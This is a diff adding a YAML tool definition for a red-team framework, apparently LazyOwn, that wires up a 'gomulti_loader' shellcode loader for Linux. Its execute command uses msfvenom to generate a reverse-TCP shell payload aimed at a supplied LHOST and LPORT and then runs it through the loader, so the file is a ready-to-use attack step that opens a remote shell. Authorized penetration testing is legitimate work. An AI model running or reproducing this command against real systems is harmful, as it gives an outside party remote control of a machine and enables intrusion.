@@ -1,0 +1,21 @@
+name: gomulti_loader_linux
+description: >
+  gomulti_loader shellcode in windows and linux
+author: "LazyOwn RedTeam"
+version: "1.0"
+enabled: true
+params:
+  - name: lhost
+    type: string
+    required: true
+    description: lhost target.
+  - name: lport
+    type: string
+    required: true
+    description: lport to operate.
+tool:
+  name: gomulti_loader_linux
+  repo_url: https://github.com/grisuno/gomulti_loader.git
+  install_path: external/.exploit/gomulti_loader
+  install_command: make linux
+  execute_command: msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f c -o shellcode_test.txt ; ./loader_linux -shellcode shellcode_test.txt
